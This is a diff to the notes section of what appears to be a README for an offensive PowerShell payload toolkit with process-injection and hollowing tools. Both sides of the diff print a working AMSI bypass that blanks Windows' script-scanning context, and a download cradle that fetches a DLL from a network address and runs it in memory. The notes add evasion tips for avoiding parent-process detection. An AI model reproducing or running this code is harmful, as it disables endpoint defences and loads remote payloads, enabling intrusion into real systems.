@@ -41,10 +41,14 @@ vbobfuscate.ps1 - ps1 to generate caeser cipher code for pscradle.  Make sure of
 
 # NOTES
   
-Powershell AMSI bypass: $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+Powershell AMSI bypass:
   
- Powershell Dll downloadcradle: $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.195/basic.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType("dll.Class1");$method = $class.GetMethod("runner");$method.Invoke(0, $null)  **NOTE: replace ip/file name but leave rest as is when using D/invoke builder generated payloads!
-
+  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+  
+ Powershell Dll download cradle (replace ip/file name but leave rest as is when using D/invoke builder generated payloads!):
+  
+ $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.195/basic.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType("dll.Class1");$method = $class.GetMethod("runner");$method.Invoke(0, $null)  
+  
 With Powerinject/Powerhollow make sure you think about whether you will be calling PS download cradle from powershell or cmd.exe and use the appropriate mode when constructing payloads.  When you call powershell.exe <cradle> from cmd.exe or even from another powershell window, you are creating a child process and while the embedded AMSI bypass may work for the child process the parent process will detect the child performing malicious actions and flag it.
   
 Do NOT use msfvenom encoders with any Hollowing tool. Causes problems.
